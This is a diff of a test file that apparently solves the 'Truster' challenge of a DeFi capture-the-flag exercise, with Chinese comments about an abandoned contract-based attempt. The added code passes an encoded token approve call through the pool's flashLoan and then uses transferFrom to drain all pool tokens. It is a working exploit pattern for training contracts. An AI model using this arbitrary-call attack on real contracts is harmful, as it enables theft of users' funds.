@@ -29,6 +29,19 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        //原本想用合約寫, 但不知道為什麼一直有問題, 還在找
+        /*const TrusterExploit = await ethers.getContractFactory('TrusterExploit', deployer);
+        this.exploit = await TrusterExploit.deploy();
+        await this.exploit.connect(attacker.address).attack(this.pool.address, this.token.address, TOKENS_IN_POOL);*/
+
+        //決定換直接用abi來做
+        const ABI = ["function approve(address spender, uint256 amount)"];
+        const interface = new ethers.utils.Interface(ABI);
+        const data = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
+
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
